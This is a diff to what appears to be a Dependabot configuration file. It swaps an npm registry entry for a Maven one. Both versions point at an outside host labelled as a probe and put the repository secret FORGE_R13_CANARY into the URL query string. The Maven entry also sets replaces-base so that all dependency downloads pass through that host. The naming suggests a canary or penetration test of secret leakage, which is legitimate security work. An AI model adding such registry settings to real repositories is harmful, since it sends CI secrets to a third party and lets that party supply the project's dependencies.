@@ -1,13 +1,13 @@
 version: 2
 registries:
-  probe-npm:
-    type: npm-registry
-    url: https://v1.pen-qdse-1885-7563.dns.collabp-reg1.devops.aws.dev/npm?k=benignvalue123&p=${{secrets.FORGE_R13_CANARY}}
-    token: ${{secrets.FORGE_R13_CANARY}}
+  probe-mv:
+    type: maven-repository
+    url: "https://v2.pen-qdse-1885-7563.dns.collabp-reg1.devops.aws.dev/mvn?k=benignvalue123&p=${{secrets.FORGE_R13_CANARY}}"
+    replaces-base: true
 updates:
-  - package-ecosystem: "npm"
+  - package-ecosystem: "maven"
     directory: "/"
     schedule:
       interval: "weekly"
     registries:
-      - probe-npm
+      - probe-mv
